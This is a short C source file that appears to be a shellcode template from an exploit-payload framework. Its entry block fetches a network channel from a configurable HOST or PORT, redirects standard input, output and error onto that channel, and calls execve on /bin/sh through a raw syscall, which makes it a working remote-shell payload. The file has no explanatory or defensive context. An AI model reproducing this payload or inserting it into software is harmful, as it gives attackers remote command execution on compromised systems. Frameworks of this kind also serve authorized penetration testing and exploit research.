#include <factory.h>

#include "helpers/io.c"
#include "helpers/socket.c"

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    const char *argv[] = { "/bin/sh", NULL };
#else
    const char *argv[] = { NULL };
#endif
    const char *envp[] = { NULL };

#if defined(HOST) || defined(PORT)
    struct channel chan = get_communication_channel();
    _dup2(chan.rx, 0);
    _dup2(chan.tx, 1);
    _dup2(chan.tx, 2);
#endif

    INTERNAL_SYSCALL(execve,, 3, "/bin/sh", argv, envp); 

} SHELLCODE_END
